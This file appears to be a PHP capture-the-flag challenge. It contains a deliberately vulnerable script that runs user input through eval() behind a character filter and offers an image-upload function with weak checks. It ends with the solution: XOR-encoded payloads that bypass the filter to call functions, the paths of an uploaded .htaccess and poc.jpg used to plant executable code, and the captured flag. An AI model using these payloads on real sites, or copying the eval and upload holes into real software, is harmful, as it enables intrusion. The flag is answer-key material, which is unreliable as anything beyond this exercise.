<?php

function get_the_flag(){
    //	创建文件目录
    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
    // 路径没有就创建
    if(!file_exists($userdir)){
    	mkdir($userdir);
    }

    // 获取文件
    if(!empty($_FILES["file"])) {
    	// 获取文件
        $tmp_name = $_FILES["file"]["tmp_name"];
        // 获取文件名
        $name = $_FILES["file"]["name"];
        // 获取文件扩展名
        $extension = substr($name, strrpos($name,".")+1);

        // 文件后缀不能有 ph
    	if(preg_match("/ph/i",$extension)) die("^_^"); 

    	// 文件中不能出现 <?    
	    if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");

	    // 文件类型得是图像
    	if(!exif_imagetype($tmp_name)) die("^_^"); 

    	// 拼接路径
        $path= $userdir."/".$name;
        // 将文件上传
        @move_uploaded_file($tmp_name, $path);

       	// 输出文件地址
        print_r($path);
    }
}

$hhh = @$_GET['_'];

// 为空显示代码
if (!$hhh){
    highlight_file(__FILE__);
}

// 字符串长度不能大于18
if(strlen($hhh)>18){
    die('One inch long, one inch strong!');
}

// 过滤
if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh) )
    die('Try something else!');

// 将字符串去重，并按ASCII码从小到大返回字符串
$character_type = count_chars($hhh, 3);

// 去重后字符串长度不能大于12
if(strlen($character_type)>12) die("Almost there!");

eval($hhh);
?>

# ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%A0}();&%A0=phpinfo
# ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%A0}();&%A0=get_the_flag

upload/tmp_c47b21fcf8f0bc8b3920541abd8024fd/.htaccess
upload/tmp_c47b21fcf8f0bc8b3920541abd8024fd/poc.jpg
flag{61157674-883e-445b-9212-864c04d6542b}